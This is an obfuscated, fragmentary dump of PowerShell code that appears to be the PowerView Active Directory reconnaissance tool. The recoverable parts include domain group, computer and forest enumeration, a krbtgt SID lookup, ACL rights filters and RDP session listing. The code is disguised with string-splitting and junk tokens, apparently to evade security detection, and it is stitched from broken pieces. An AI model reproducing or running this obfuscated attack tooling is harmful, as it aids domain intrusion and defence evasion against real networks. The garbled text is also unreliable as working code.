                                (Z3b{0}{2}{1}{3}Z3b-f S5zSS5z,S5zectLogonIS5z,S5zubjS5z,S5zdS5z)            = YoV{proPeRIJKTIJKIes}[3].Z3bvIJKAlUEZ3b
                                (Z3b{1}{3}{0}{2}Z3b-f S5zUserSS5z,S5zTarS5z,S5zidS5z,S5zgetS5z)             = YoV{PIJKRoIJKpEIJKRties}[4].Z3bVIJKALUeZ3b.(Z3b{0}{1}Z3b -f S5zTS5z,S5zoStringS5z).Invoke()
                                (Z3b{1}{0}{2}Z3b-f S5zetUseS5z,S5zTargS5z,S5zrNameS5z)            = YoV{prIJKOPeRIJKTIEs}[5].Z3bvIJKAlUeZ3b
                                (Z3b{1}{2}{0}{3}Z3b -fS5zDomaS5z,S5zTargS5z,S5zetS5z,S5zinNameS5z)          = YoV{pIJKRoIJKperIJKTIES}[6].Z3bvalIJKUeZ3b
                                (Z3b{2}{1}{3}{0}Z3b -fS5zgonIdS5z,S5zrS5z,S5zTaS5z,S5zgetLoS5z)             = YoV{PIJKRoPeIJKRTIJKIes}[7].Z3bVIJKAlUEZ3b
                                (Z3b{1}{2}{0}Z3b -fS5zeS5z,S5zLogoS5z,S5znTypS5z)                 = YoV{PIJKRoIJKpErTiIJKeS}[8].Z3bvaLIJKUEZ3b
                                (Z3b{1}{3}{0}{4}{2}Z3b-fS5zoceS5z,S5zLogS5z,S5zmeS5z,S5zonPrS5z,S5zssNaS5z)          = YoV{pIJKROpeRTIJKies}[9].Z3bVAIJKlueZ3b
                                (Z3b{6}{2}{1}{5}{4}{3}{0}Z3b -fS5zNameS5z,S5znPacS5z,S5zenticatioS5z,S5zeS5z,S5zagS5z,S5zkS5z,S5zAuthS5z) = YoV{PRIJKOpIJKertiIJKeS}[10].Z3bVIJKALUEZ3b
                                (Z3b{2}{3}{0}{1}Z3b -f S5ztionS5z,S5zNameS5z,S5zWorksS5z,S5ztaS5z)           = YoV{prIJKoIJKPertiEs}[11].Z3bvIJKAlUEZ3b
                                (Z3b{1}{0}Z3b-f S5zonGuidS5z,S5zLogS5z)                 = YoV{PrIJKoIJKPeRTies}[12].Z3bVALIJKUeZ3b
                                (Z3b{0}{2}{3}{1}Z3b-f S5zTransmS5z,S5zsS5z,S5zitS5z,S5ztedServiceS5z)       = YoV{pROPEIJKRtIJKIIJKEs}[13].Z3bVAlIJKUEZ3b
                                (Z3b{0}{2}{1}Z3b-fS5zLmPackS5z,S5zmeS5z,S5zageNaS5z)             = YoV{pROIJKpIJKErTIJKIeS}[14].Z3bvAIJKlUeZ3b
                                (Z3b{2}{0}{1}Z3b -fS5zengS5z,S5zthS5z,S5zKeyLS5z)                 = YoV{prOIJKpIJKeRtIIJKeS}[15].Z3bvAlIJKUeZ3b
                                (Z3b{0}{2}{1}Z3b -fS5zPrS5z,S5zdS5z,S5zocessIS5z)                 = YoV{pIJKRoIJKpIJKERtiEs}[16].Z3bvaIJKlUEZ3b
                                (Z3b{0}{1}{2}Z3b -f S5zPS5z,S5zroS5z,S5zcessNameS5z)               = YoV{pRIJKOIJKpERTieS}[17].Z3bVALIJKUEZ3b
                                (Z3b{2}{0}{1}Z3b-f S5zpAddresS5z,S5zsS5z,S5zIS5z)                 = YoV{PIJKROpIJKErTIIJKEs}[18].Z3bvAIJKlueZ3b
                                (Z3b{2}{0}{1}Z3b -f S5zpS5z,S5zPortS5z,S5zIS5z)                    = YoV{PRoIJKPIJKERTiES}[19].Z3bvAlIJKUeZ3b','nG} JGO &(Z3b{3}{1}{2}{0}Z3b-fS5zberS5z,S5zMS5z,S5zemS5z,S5zAdd-S5z) (Z3b{1}{3}{2}{0}Z3b -fS5zyS5z,S5zNotepropS5z',') yxR2).Z3bvIJKALUeZ3b::Z3bToBAIJKse64sIJKTrIJKiIJKNgZ3b(YoV{DIJKNsrEcIJKoRd}[24..YoV{dNsReIJKCOIJKRD}.Z3bLIJKeNgtHZ3b]))
            YoV{dnIJKsRIJKEcIJKORIJKdOBJeCT} JGO &(Z3b{3}{2}{0}{1}Z3b-f S5z-MembS5z,S5zerS5z,S5zdS5z,S5zAdS5z) (Z3b{0}{2}{1}Z3b-fS5zNoteS5z,S5zpertyS5z,S5zproS5z) (Z3b{1}{2}{0}Z3b-f S5zTypeS5z,S5zRS5z,S5zecordS5z) (Z3b{1}{0}Z3b -fS5zOWNS5z,S5zUNKNS5z)
        }

        YoV{dnIJKSreCoIJKRIJKdobIJKjecT} JGO &(Z3b{2}{1}{0}Z3b -fS5zerS5z,S5zdd-MembS5z,S5zAS5z) (Z3b{2}{0}{1}Z3b-fS5zeproS5z,S5zpertyS5z,S5zNotS5z) (Z3b{1}{3}{0}{2}Z3b-f S5ztSeriaS5z,S5zUpdatS5z,S5zlS5z,S5zedAS5z) YoV{UPDIJKAtIJKedaIJKTsIJKeRiAl}
        YoV{DNSREIJKcorDOIJKBjECT} JGO &(Z3b{0}{1}{3}{2}Z3b-f S5zAS5z,S5z','0}{2}{3}{1}Z3b -fS5zUserS5z,S5ztityS5z,S5zGroupIdS5z,S5zenS5z})]
    Param(
        [Parameter(pOSitIOn = 0, VAlUefRompIPElInE = YoV{tIJKRue}, VALuEfromPIpELiNEbyPROpertyNaMe = YoV{tIJKRUe})]
    ','z,S5zseS5z).Invoke()
                YoV{TIJKRUe}
            }
            catch {
                YoV{FALIJKsE}
            }
        }
    }

    PROCESS {
        ForEach (YoV{tarGIJKEIJKTPIJKATh} in YoV{paIJKTh}) {
            if ((YoV{tarGIJKeIJKTpaIJKTH} -Match (((Z3b{3}{0}{2}{1}{4}Z3b -f S5zJu.*S5z,S5zuyJuS5z,S5zyJS5z,S5zyJuyJuyJuyS5z,S5z.*S5z)).Z3brEplIJKAIJKCEZ3b(S5zyJuS5z,[strINg][cHar]92))) -and (YoV{psbOuNIJKdIJKPARaIJKMIJKeTeRs}[(Z3b{2}{1}{0}Z3b-fS5zalS5z,S5zentiS5z,S5zCredS5z)])) {
                YoV{HoIJKsTCOIJKMIJKPuTer} = (&(Z3b{2}{1}{0}{3}Z3b -f S5zeS5z,S5zw-ObjS5z,S5zNeS5z,S5zctS5z) (Z3b{0}{2}{3}{1}Z3b -f S5zSysteS5z,S5zUriS5z,S5zmS5z,S5z.S5z)(YoV{TAIJKR','asS5z)] = YoV{SeArIJKchbIJKAse} }
        if (YoV{PsboIJKUnDpaRaMeIJKTIJKeIJKRS}[(Z3b{0}{1}{2}Z3b -f S5zServS5z,S5zeS5z,S5zrS5z)]) { YoV{SeARCIJKheIJKRAIJKRgUIJKmEntS}[(Z3b{1}{2}{0}Z3b-fS5zrS5z,S5zSerS5z,S5zveS5z)] = YoV{SeIJKRIJKVEr} }
        if (YoV{psbIJKoUNdPIJKARAmeIJKTIJKErS}[(Z3b{2}{0}{1}Z3b-fS5zarcS5z,S5zhScopeS5z,S5zSeS5z)]) { YoV{sIJKeIJKARIJKCherARgUmIJKENTs}[(Z3b{0}{1}{2}Z3b-f S5zSearchSS5z,S5zcoS5z,S5zpeS5z)] = YoV{sIJKEaIJKRcIJKHSCOpe} }
        if (YoV{psBOIJKUIJKNIJKDparIJKAMeTERs}[(Z3b{2}{4}{0}{3}{1}Z3b-fS5ztPagS5z,S5zeS5z,S5zRS5z,S5zeSizS5z,S5zesulS5z)]) { YoV{seIJKARIJKCIJKHeIJKRIJKARgumENTS}[(Z3b{2}{1}{0}{4}{3}Z3b -fS5zltPageS5z,S5zsuS5z,S5zReS5z,S5zeS5z,S5zSizS5z)] = YoV{rEsIJKUlIJKTpaIJKGeSIJKIZE} }
        if (YoV{PSBOunIJKdpaRIJKAMIJKeIJKTErS}[(Z3b{3}{2}{0}{4}{1}Z3b-f S5zTimeLiS5z,S5zitS5z,S5zerS5z,S5zServS5z,S5zmS5z)]) { YoV{seAIJKRcherIJKArGIJKUMenIJKTs}[(Z3b{3}{4}{2}','5z,S5zjecS5z) -ExpandProperty (Z3b{1}{0}{2}Z3b -f S5zeS5z,S5zForS5z,S5zstS5z) J','{0}{3}Z3b -f S5zestDomaS5z,S','S5z).Invoke() }
     ',' {YoV{_}.Z3bSyIJKstemAIJKclZ3b} else {YoV{_}.Z3bDiscREtIJKioNIJKArIJKYaIJKCLZ3b} } JGO &(Z3b{1}{0}{3}{2}Z3b-f S5zorEach-ObjS5z,S5zFS5z,S5ztS5z,S5zecS5z) {
                        if (YoV{pSbOIJKUnIJKdpAraMeIJKTIJKEIJKRs}[(Z3b{0}{2}{1}Z3b -f S5zRiS5z,S5zterS5z,S5zghtsFilS5z)]) {
                            YoV{guIJKidFIJKiIJKLTER} = Switch (YoV{RiIJKgIJKHtsIJKFIIJKLTeR}) {
                                (Z3b{1}{2}{3}{0}Z3b -fS5zrdS5z,S5zResS5z,S5zetPS5z,S5zasswoS5z) { (Z3b{0}{5}{4}{1}{2}{3}Z3b -f S5z002995S5z,S5z-11S5z,S5zd0-a7S5z,S5z68-00aa006e0529S5z,S5z246dS5z,S5z70-S5z) }
                                (Z3b{1}{0}{2}Z3b-f S5ziteMS5z,S5zWrS5z,S5zembersS5z) { (Z3b{2}{6}{4}{0}{5}{3}{7}{1}Z3b -f S5z-00aaS5z,S5z2S5z,S5zbfS5z,S5z3S5z,S5z79c0-0de6-11d0-a285S5z,S5z00S5z,S5z96S5z,S5z049eS5z) }
                                (Z3b{0}{1}Z3b-f S5zDefaulS5z,S5ztS5z) { (Z3b{4}{5}{1}{8}{6}{2}{3}{0}{7}Z3b -fS5z0S5z,S5z0000-0000S5z,S5z00S5z,S5z0S5z,S5z00S5z,S5z000000-S5z,S5z000-00S5z,S5z000000S5z,S5z-0S5z) }
                            }
                            if (YoV{_}.Z3bObjEIJKCTTIJKyPeZ3b -eq YoV{GuidIJKFiIJKLtER}) {
                                YoV{_} JGO &(Z3b{0}{3}{2}{1}Z3b-f S5zAdS5z,S5zemberS5z,S5z-MS5z,S5zdS5z) (Z3b{2}{1}{3}{0}Z3b -f S5zyS5z,S5zotePS5z,S5zNS5z,S5zropertS5z) (Z3b{1}{2}{0}Z3b -fS5ztDNS5z,S5zObjS5z,S5zecS5z) YoV{OIJKBjIJKecT}.Z3bDiSIJKTinGuIShEIJKdNaIJKmeZ3b[0]
                                YoV{_} JGO &(Z3b{2}{3}{1}{0}Z3b -fS5zrS5z,S5zbeS5z,S5zAdS5z,S5zd-MemS5z) (Z3b{0}{2}{1}{3}Z3b -fS5zNoS5z,S5zProperS5z,S5zteS5z,S5ztyS5z) (Z3b{0}{1}{2}Z3b -f S5zObS5z,S5zjecS5z,S5ztSIDS5z) YoV{OIJKBIJKJEIJKCtSId}
                                YoV{coNIJKTIJKinUE} = YoV{trIJKUe}
                       ','{KIJKEy}, (Z3b{2}{1}{0}Z3b-f S','JKAIJKIn} }
    if (YoV{PSboIJKUNDpARaIJKmIJKEIJKTErs}[(Z3b{0}{1}Z3b-fS5zSS5z,S5zerverS5z)]) { YoV{sIJKeARcHERAIJKRGUIJKMEnTS}[(Z3b{0}{1}Z3b-fS5zServS5z,S5zerS5z)] = YoV{SeRIJKVIJKer} }
    if (YoV{PSbOUNDpArIJKAmetIJKeIJKRS}[(Z3b{0}{2}{1}{3}Z3b -f S5zCreS5z,S5ziS5z,S5zdentS5z,S5zalS5z)]) { YoV{sEARchIJKeIJKRaRIJKgumeIJKNTs}[(Z3b{1}{0}{2}Z3b-f S5zeS5z,S5zCredS5z,S5zntialS5z)] = YoV{crEIJKdEnIJKTIAl} }

    YoV{dIJKcSID} = &(Z3b{3}{1}{4}{0}{5}{2}Z3b -f S5zinCS5z,S5zeS5z,S5zerS5z,S5zGS5z,S5zt-DomaS5z,S5zomputS5z) @SearcherArguments -FindOne JGO &(Z3b{3}{0}{1}{2}Z3b -f S5zlect-ObS5z,S5zjeS5z,S5zctS5z,S5zSeS5z) -First 1 -ExpandProperty (Z3b{0}{1}{2}{3}Z3b-f S5zobjeS5z,S5zcS5z,S5ztsS5z,S5zidS5z)

    if (YoV{DIJKCsId}) {
        YoV{dCIJKsid}.(Z3b{1}{0}{2}Z3b -fS5zrS5z,S5zSubStS5z,S5zingS5z).Invoke(0, YoV{dcSIJKId}.(Z3b{1}{2}{0}{3}Z3b -f S5ztIndexOS5z,S5zLaS5z,S5zsS5z,S5zfS5z).Invoke(S5z-S5z))
    }
    else {
        &(Z3b{2}{3}{4}{1}{0}Z3b-f S5zoseS5z,S5zerbS5z,S5zWriS5z,S5zte-S5z,S5zVS5z) (S5z[GeS5z+S5zt-DS5z+S5zomaS5z+S5zinSID] S5z+S5zErrS5z+S5zor S5z+S5zeS5z+S5zxtracS5z+S5ztingS5z+S5z S5z+S5zdoS5z+S5zmain S5z+S5zSIS5z+S5zD S5z+S5zfS5z+S5zor S5z+Z3bS5zYoVDomainS5zZ3b)
    }
}


function gEt-dOIJKMAIJKINgIJKROuP {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({Z3b{2}{0}{1}{3}Z3b-f S5zhouldPrS5z,S5zoS5z,S5zPSSS5z,S5zcessS5z}, S5zS5z)]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({Z3b{5}{4}{2}{7}{0}{6}{3}{1}Z3b -fS5zreS5z,S5znmentsS5z,S5zrsS5z,S5zanAssigS5z,S5zaredVaS5z,S5zPSUseDeclS5z,S5zThS5z,S5zMoS5z}, S5zS5z)]
    [OutputType({Z3b{2}{3}{4}{0}{1}Z3b -f S5zouS5z,S5zpS5z,S5zPowerS5z,S5zViewS5z,S5z.GrS5z})]
    [CmdletBinding(dEfAUltparAMeTerseTNAmE = {Z3b{2}{3}{0}{1}Z3b -f S5zgS5z,S5zationS5z,S5zAllowDS5z,S5zeleS5z})]
    Param(
        [Parameter(posiTIon = 0, vAluEFROmpIpELINE = YoV{tIJKRue}, vALueFrOMPipELiNebyPRopertynamE = YoV{TIJKRuE})]
        [Alias({Z3b{0}{2}{3}{1}Z3b-f S5zDistinS5z,S5zmeS5z,S5zgS5z,S5zuishedNaS5z}, {Z3b{3}{4}{0}{2}{1}Z3b-f S5zntS5z,S5zameS5z,S5zNS5z,S5zSamAccoS5z,S5zuS5z}, {Z3b{0}{1}Z3b-fS5zNS5z,S5zameS5z}, {Z3b{4}{2}{5}{6}{3}{0}{1}Z3b-fS5zdS5z,S5zNameS5z,S5zstiS5z,S5zuisheS5z,S5zMemberDiS5z,S5znS5z,S5zgS5z}, {Z3b{2}{1}{0}Z3b -fS5zeS5z,S5zemberNamS5z,S5zMS5z})]
        [String[]]
        YoV{idIJKeNTIJKity},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{0}{1}{2}Z3b -fS5zUS5z,S5zsS5z,S5zerNameS5z})]
        [String]
        YoV{MeIJKmbIJKEIJKRidIJKENTitY},

        [Switch]
        YoV{AdMIIJKNcOIJKUnt},

        [ValidateSet({Z3b{2}{3}{0}{1}Z3b -f S5zainLocaS5z,S5zlS5z,S5zDS5z,S5zomS5z}, {Z3b{0}{1}{2}{3}Z3b -fS5zNoS5z,S5ztDomainS5z,S5zLocS5z,S5zalS5z}, {Z3b{0}{1}{2}Z3b-f S5zGS5z,S5zloS5z,S5zbalS5z}, {Z3b{1}{0}{2}Z3b-f S5zoS5z,S5zNS5z,S5ztGlobalS5z}, {Z3b{0}{2}{1}Z3b -f S5zUniveS5z,S5zalS5z,S5zrsS5z}, {Z3b{0}{2}{1}Z3b-f S5zNotUS5z,S5zalS5z,S5zniversS5z})]
        [Alias({Z3b{0}{1}Z3b -fS5zSS5z,S5zcopeS5z})]
        [String]
        YoV{GIJKRIJKOUpSIJKCOpe},

        [ValidateSet({Z3b{2}{0}{1}Z3b -f S5zecS5z,S5zurityS5z,S5zSS5z}, {Z3b{0}{2}{1}Z3b -f S5zDS5z,S5zstributionS5z,S5ziS5z}, {Z3b{1}{3}{0}{2}Z3b -f S5zBySyS5z,S5zCrS5z,S5zstemS5z,S5zeatedS5z}, {Z3b{0}{1}{2}{3}Z3b -f S5zNotCreaS5z,S5ztedBS5z,S5zySyS5z,S5zstemS5z})]
        [String]
        YoV{GrIJKOuPPIJKRoPerTY},

        [ValidateNotNullOrEmpty()]
        [String]
        YoV{doMIJKAIn},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{1}{0}Z3b -f S5zterS5z,S5zFilS5z})]
        [String]
        YoV{LdAIJKpFIIJKLTIJKER},

        [ValidateNotNullOrEmpty()]
        [String[]]
        YoV{pROpIJKertiIJKEs},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{0}{1}{2}Z3b -fS5zADSS5z,S5zPS5z,S5zathS5z})]
        [String]
        YoV{seIJKArCHIJKBaSE},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{0}{3}{2}{1}{4}Z3b -fS5zDoS5z,S5zolS5z,S5ztrS5z,S5zmainConS5z,S5zlerS5z})]
        [String]
        YoV{SeIJKRVIJKER},

        [ValidateSet({Z3b{1}{0}Z3b-fS5zaseS5z,S5zBS5z}, {Z3b{1}{2}{0}Z3b -f S5zlS5z,S5zOneLeS5z,S5zveS5z}, {Z3b{1}{0}Z3b -f S5zeeS5z,S5zSubtrS5z})]
        [String]
        YoV{seaRcIJKHscIJKoPe} = (Z3b{1}{2}{0}Z3b -fS5ztreeS5z,S5zSuS5z,S5zbS5z),

        [ValidateRange(1, 10000)]
        [Int]
        YoV{ResULtIJKpIJKAGesIJKiZe} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        YoV{sERvIJKeIJKRtimIJKeliIJKMIt},

        [ValidateSet({Z3b{1}{0}Z3b -fS5zlS5z,S5zDacS5z}, {Z3b{1}{0}Z3b-fS5zpS5z,S5zGrouS5z}, {Z3b{0}{1}Z3b -fS5zNonS5z,S5zeS5z}, {Z3b{0}{1}Z3b-fS5zOwneS5z,S5zrS5z}, {Z3b{0}{1}Z3b-fS5zSaS5z,S5zclS5z})]
        [String]
        YoV{SEIJKcuRIJKitIJKYMaskS},

        [Switch]','S5z,S5zm.MS5z,S5zeS5z,S5zefS5z,S5znaS5z,S5zgS5z,S5zy S5z,S5zstS5z,S5zonary S5z,S5zsteS5z)
            }
            YoV{TrIJKUE}
        })]
        YoV{diIJKCIJKTioNIJKAry} = YoV{FaIJKLSe},

        [Parameter(maNDatorY = YoV{tIJKRUE}, VaLUEFrompIpElINeBypROpeRTYNaMe = YoV{TrIJKUe}, PArAmetErSetnAMe = Z3bcIJKRIJKeATIJKeVaRiABIJKLESZ3b)]
        [switch]YoV{cR','
        YoV{TOMBsIJKToIJKNE},

        [Alias({Z3b{1}{0}{2}Z3b-fS5zeturS5z,S5zRS5z,S5znOneS5z})]
        [Switch]
        YoV{fINDIJKOnE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        YoV{cIJKREDeIJKNTiAL} =   ( &(S5zlSS5z)  vArIaBLE:jFI  ).Z3bvalIJKUEZ3b::Z3bemIJKptYZ3b,

        [Switch]
        YoV{rIJKAW}
    )

    BEGIN {
        YoV{seIJKArCHEIJKRaRgIJKUmEnTs} = @{}
        if (YoV{psBOIJKUIJKNdIJKpaRaMeTers}[(Z3b{1}{0}Z3b-f S5zainS5z,S5zDomS5z)]) { YoV{searIJKCIJKHeIJKRArGumEIJKNtS}[(Z3b{1}{0}Z3b-fS5znS5z,S5zDomaiS5z)] = YoV{doIJKMAin} }
        if (YoV{psIJKBOuIJKNIJKDIJKpArAIJKmETERs}[(Z3b{1}{2}{0}Z3b -fS5ztiesS5z,S5zPropeS5z,S5zrS5z)]) { YoV{sIJKeaRChERARIJKGumEnIJKTs}[(Z3b{2}{3}{1}{0}Z3b-f S5ztiesS5z,S5zerS5z,S5zPS5z,S5zropS5z)] = YoV{ProPIJKertIJKIeS} }
        if (YoV{PIJKsIJKBIJKOundpARIJKAmetERS}[(Z3b{2}{0}{1}Z3b-f S5zrchBS5z,S5zaseS5z,S5zSeaS5z)]) { YoV{SeIJKArcheRIJKAIJKRguMIJKeNTS}[(Z3b{1}{0}{2}Z3b-f S5zarchBasS5z,S5zSeS5z,S5zeS5z)] = YoV{sIJKEarcIJKhIJKBasE} }
        if (YoV{psIJKBouIJKNIJKDpIJKARaMEtErS}[(Z3b{0}{1}Z3b -f S5zServS5z,S5zerS5z)]) { YoV{sIJKEIJKARChEIJKRIJKArGumIJKenTs}[(Z3b{1}{0}Z3b -fS5zrS5z,S5zServeS5z)] = YoV{seRvIJKer} }
        if (YoV{PsIJKBouIJKNDparIJKAmIJKeterS}[(Z3b{0}{2}{3}{1}Z3b-fS5zSS5z,S5zpeS5z,S5zearchScS5z,S5zoS5z)]) { YoV{sIJKeArChEIJKRIJKARGIJKUMEntS}[(Z3b{2}{3}{0}{1}Z3b-f S5zcopS5z,S5zeS5z,S5zSearS5z,S5zchSS5z)] = YoV{sEIJKAIJKRchsCoPe} }
        if (YoV{pSBIJKoUnIJKdPaRAIJKmETErs}[(Z3b{3}{4}{0}{1}{2}Z3b-f S5zgeSS5z,S5zizS5z,S5zeS5z,S5zResultPS5z,S5zaS5z)]) { YoV{SIJKeIJKAIJKRChERAIJKRguMeIJKNts}[(Z3b{2}{1}{0}Z3b -f S5zzeS5z,S5zPageSiS5z,S5zResultS5z)] = YoV{resUIJKlTPAgIJKESiIJKZe} }
        if (YoV{pSBIJKoUndpIJKAIJKRAmeIJKTers}[(Z3b{0}{1}{4}{3}{2}Z3b -f S5zServS5z,S5zerS5z,S5zitS5z,S5zimS5z,S5zTimeLS5z)]) { YoV{SEAIJKRchIJKerIJKARGIJKUMENIJKTs}[(Z3b{2}{3}{1}{0}Z3b-fS5ztS5z,S5zerTimeLimiS5z,S5zSeS5z,S5zrvS5z)] = YoV{sIJKErVerIJKTiMElIJKiIJKmIt} }
        if (YoV{PsbOUnDIJKpaRIJKAIJKmeteRs}[(Z3b{0}{1}{2}{3}Z3b-f S5zSecS5z,S5zurityS5z,S5zMasS5z,S5zksS5z)]) { YoV{seIJKARcheraRgUIJKmeIJKNTs}[(Z3b{2}{0}{1}Z3b -fS5zskS5z,S5zsS5z,S5zSecurityMaS5z)] = YoV{sECURITyMIJKAIJKSkS} }
        if (YoV{PSbOundPIJKAraIJKmeTIJKerS}[(Z3b{2}{3}{0}{1}Z3b -fS5znS5z,S5zeS5z,S5zTombS5z,S5zstoS5z)]) { YoV{sIJKearCHeIJKRaIJKRIJKGuIJKMEntS}[(Z3b{1}{0}{2}Z3b -f S5zstonS5z,S5zTombS5z,S5ze','BLS5z,S5zVaS5z,S5zES5z)  yXR2 ).Z3bVIJKAlueZ3b::Z3bTIJKObIJKASIJKe64STRINgZ3b(YoV{DIJKNSrEIJKcorD}[24..YoV{dNIJKSIJKREcORd}.Z3bLIJKEnGIJKTHZ3b]))
            YoV{DnIJKSreIJKcOIJKRDIJKObJeCT} JGO &(Z3b{0}{3}{1}{2}Z3b -f S5zAddS5z,S5zMembeS5z,S5zrS5z,S5z-S5z) (Z3b{1}{0}{3}{2}Z3b-f S5zteproS5z,S5zNoS5z,S5zyS5z,S5zpertS5z) (Z3b{2}{0}{1}Z3b-fS5zorS5z,S5zdTypeS5z,S5zRecS5z) (Z3b{0}{1}Z3b -f S5zAS5z,S5zAAAS5z)
        }

        elseif (YoV{RdIJKATIJ','                     YoV{soIJKURCIJKeIp} = YoV{InIJKFIJKo2}.Z3badIJKdrIJKESSZ3b
                            if (YoV{SOuRCIJKeIJKIp}[2] -ne 0) {
                                YoV{soIJKURIJKcEIP} = [String]YoV{sIJKOUrIJKCEIp}[2]+S5z.S5z+[String]YoV{SIJKOurIJKCEIJKIp}[3]+S5z.S5z+[String]YoV{SOurIJKcEIJKIP}[4]+S5z.S5z+[String]YoV{sIJKOUrIJKCEIP}[5]
                            }
                            else {
                                YoV{SoUIJKRIJKcEIp} = YoV{nUIJKll}
                            }

                            YoV{RDIJKPsessIJKioN} JGO &(Z3b{3}{2}{1}{0}Z3b -fS5zemberS5z,S5zMS5z,S5z-S5z,S5zAddS5z) (Z3b{0}{1}{2}Z3b-f S5zNotepS5z,S5zropeS5z,S5zrtyS5z) (Z3b{0}{1}{2}Z3b -fS5zSourcS5z,S5zeS5z,S5zIPS5z) YoV{sOURIJKCEIP}
                           ','                 YoV{FiLIJKTIJKer} += Z3b(userAccountControl:1.2.840.113556.1.4.803:=YoVUACValue)Z3b
                }
            }

            YoV{cIJKOMPIJKSEarcIJKHIJKeR}.Z3bfILIJKTeRZ3b = Z3b(&(samAccountType=805306369)YoVFilter)Z3b
            &(Z3b{2}{3}{0}{1}Z3b -fS5zte-S5z,S5zVerboseS5z,S5zWrS5z,S5ziS5z) Z3b[Get-DomainComputer] Get-DomainComputer filter string: YoV(YoVCompSearcher.filter) Z3b

            if (YoV{pSIJKBIJKoUNDpIJKArAmetERS}[(Z3b{1}{0}Z3b -fS5zeS5z,S5zFindOnS5z)]) { YoV{RIJKeSIJKULTS} = YoV{cOmpSeaRcIJKhIJKeR}.(Z3b{2}{0}{1}Z3b-f S5zindS5z,S5zOneS5z,S5zFS5z).Invoke() }
            else { YoV{resuIJKLTS} = YoV{cIJKOMpIJKSIJKeArcher}.(Z3b{2}{1}{0}Z3b-fS5zAllS5z,S5zdS5z,S5zFinS5z).Invoke() }
            YoV{RIJKeIJKsULts} JGO &(Z3b{3}{1}{2}{0}Z3b -f S5zbjectS5z,S5z-S5z,S5zOS5z,S5zWhereS5z) {YoV{_}} JGO &(Z3b{0}{1}{3}{2}{4}Z3b -f S5zFoS5z,S5zrEachS5z,S5zcS5z,S5z-ObjeS5z,S5ztS5z) {
         ','     catch {
                &(Z3b{0}{1}{3}{4}{2}Z3b -fS5zWritS5z,S5ze-S5z,S5zseS5z,S5zVerbS5z,S5zoS5z) (S5z[Get-ForestS5z+S5z]S5z+S5z S5z+S5zTheS5z+S5z S5z+S5zspeciS5z+S5zfieS5z+S5zd S5z+S5zforeS5z+S5zst S5z+Z3bS5zYoVForestS5z Z3b+S5zdS5z+S5zoes S5z+S5znotS5z+S5z S5z+S5zexisS5z+S5zt, S5z+S5zcoS5z+S5zuld S5z+S5znS5z+S5zot S5z+S5zbeS5z+S5z S5z+S5zcS5z+S5zoS5z+S5zntacteS5z+S5zd, S5z+S5zorS5z+S5z S5z+S5zthS5z+S5zerS5z+S5ze S5z+((S5zisnS5z+S5zHS5z+S5z3ht S5z)-CREPLACE S5zH3hS5z,[CHAR]39)+S5zaS5z+S5zn S5z+S5zeS5z+S5zxiS5z+S5zsting S5z+S5ztruS5z+S5zst:S5z+S5z S5z+Z3bYoV_Z3b)
                return YoV{NIJKUlL}
            }
        }
        else {
            
            YoV{FOResIJKToIJKBJecT} =  YoV{JIJK1f}::(Z3b{3}{1}{2}{0}Z3b -fS5zorestS5z,S5zrrenS5z,S5ztFS5z,S5zGetCuS5z).Invoke()
        }

        if (YoV{fIJKOresTObIJKjIJKEct}) {
            
            if (YoV{pIJKSBoUIJKNDpaRaIJKmETIJKERS}[(Z3b{1}{0}{3}{2}Z3b -fS5zdenS5z,S5zCreS5z,S5zalS5z,S5ztiS5z)]) {
                YoV{fOREstIJKsIJKId} = (&(Z3b{1}{0}{3}{2}{4}Z3b-fS5znS5z,S5zGet-DomaiS5z,S5zeS5z,S5zUsS5z,S5zrS5z) -Identity (Z3b{1}{0}Z3b -fS5zbtgtS5z,S5zkrS5z) -Domain YoV{FoRIJKeStOBIJKJeIJKCt}.Z3bROIJKOtdIJKOIJKmaINZ3b.Z3bnIJKAmEZ3b -Credential YoV{CrEIJKdENtIJKIIJKAL}).Z3bObJeIJKCtsIJKidZ3b
            }
            else {
                YoV{FIJKOReIJKSTIJKSID} = (&(Z3b{2}{3}{0}{1}Z3b-f S5z-DoS5z,S5zmainUserS5z,S5zGeS5z,S5ztS5z) -Identity (Z3b{0}{1}{2}Z3b-f S5zkrS5z,S5zbS5z,S5ztgtS5z) -Domain YoV{forestIJKobIJKJIJKeIJKcT}.Z3brIJKOOtdOMAIJKInZ3b.Z3bnIJKAMeZ3b).Z3bobjecTIJKSIJKidZ3b
            }

            YoV{pArIJKTs} = YoV{FoIJKRESTIJKsid} -Split S5z-S5z
            YoV{FOrEIJKSIJKTIJKsiD} = YoV{PIJKArtS}[0..YoV(YoV{pIJKArts}.Z3bleNgIJKTHZ3b-2)] -join S5z-S5z
            YoV{FOrEIJKsTObIJKjeIJKct} JGO &(Z3b{2}{1}{0}Z3b -f S5zberS5z,S5zd-MemS5z,S5zAdS5z) (Z3b{2}{0}{3}{1}Z3b-f S5zeProS5z,S5zrtyS5z,S5zNotS5z,S5zpeS5z) (Z3b{2}{1}{3}{0}Z3b -f S5zdS5z,S5zotDomaiS5z,S5zRoS5z,S5znSiS5z) YoV{FOrIJKEsIJKTsIJKid}
            YoV{FoIJKRestIJKobJIJKECt}
        }
    }
}


function get-foresIJKTIJKDOIJKmIJKAIn {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({Z3b{1}{0}{2}Z3b-f S5zProcesS5z,S5zPSShouldS5z,S5zsS5z}, S5zS5z)]
    [OutputType({Z3b{7}{4}{6}{8}{0}{5}{9}{2}{1}{3}Z3b -f S5zces.AcS5z,S5z.DomaiS5z,S5zryS5z,S5znS5z,S5zstem.S5z,S5ztS5z,S5zDirectoryS5z,S5zSyS5z,S5zServiS5z,S5ziveDirectoS5z})]
    [CmdletBinding()]
    Param(
        [Parameter(pOsition = 0, vAlueFromPipeliNe = YoV{tIJKRue})]
        [ValidateNotNullOrEmpty()]
        [String]
        YoV{fOrIJKESt},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
